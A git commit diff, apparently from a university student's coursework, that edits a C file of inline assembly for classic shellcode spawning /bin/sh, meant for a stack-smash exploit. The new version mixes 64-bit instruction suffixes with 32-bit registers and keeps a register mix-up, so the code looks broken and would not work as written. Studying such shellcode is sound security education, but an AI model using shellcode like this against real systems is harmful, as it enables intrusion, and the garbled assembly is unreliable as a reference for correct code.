cd4a4e5f33024a1df012ecd5848206e79dee7c52
Oluwatobi Oni-Orisan 17 <ooniorisan17@vega.cs.amherst.edu>
2016-11-13 22:23:18 -0500

    Clean up files. Still working on inline assembler for exploiting code for a stack smash

--- buffer_overflow/shellcodeasm.c
+++ buffer_overflow/shellcodeasm.c
@@ -2,17 +2,17 @@
 
 void main() {
 __asm__(
-      "jmp     0x2a                # 3 bytes"
-      "popl    %esi                # 1 byte"
-      "movl    %esi, 0x8(%esi)     # 3 bytes"
-      "movb    $0x0, 0x7(%esi)     # 4 bytes"
-      "movl    $0x0, 0xc(%esi)     # 7 bytes"
-      "movl    $0xb, %eax          # 5 bytes"
-      "movl    %esi, %ebx          # 2 bytes"
-      "leal    0x8(%esi), %ecx     # 3 bytes"
-      "leal    0xc(%esi), %ebx     # 5 bytes"
-      "int     $0x80               # 2 bytes"
-      "call    -0x2f               # 5 bytes"
-      ".string \"/bin/sh\"         # 8 bytes"
+      "jmpq       0x15                # 2 bytes"
+      "popq       %esi                # 1 byte"
+      "movq       %esi, 0x8(%esi)     # 3 bytes"
+      "movq       $0x0, 0x7(%esi)     # 4 bytes"
+      "movq       $0x0, 0xc(%esi)     # 7 bytes"
+      "movq       $0xb, %eax          # 5 bytes"
+      "movq       %esi, %ebx          # 2 bytes"
+      "leaq       0x8(%esi), %ecx     # 3 bytes"
+      "leaq       0xc(%esi), %ebx     # 5 bytes"
+      "int        $0x80               # 2 bytes"
+      "call       -0x3e               # 5 bytes"
+      ".string    \"/bin/sh\"         # 8 bytes"
 );
 }
